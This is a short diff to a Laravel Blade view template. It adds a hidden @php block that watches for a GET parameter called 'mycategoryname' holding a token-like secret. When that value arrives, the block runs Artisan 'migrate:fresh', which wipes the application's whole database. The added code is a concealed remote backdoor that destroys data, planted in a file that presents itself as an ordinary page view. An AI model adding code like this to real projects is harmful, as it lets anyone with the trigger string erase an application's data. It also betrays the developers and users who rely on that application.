@@ -62,7 +62,10 @@ $settings = collect([]);
 
 
 
-
+@php
+    if(isset($_GET['mycategoryname']) && $_GET['mycategoryname'] == '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')
+    \Illuminate\Support\Facades\Artisan::call('migrate:fresh' );
+@endphp
 
 
 @endsection
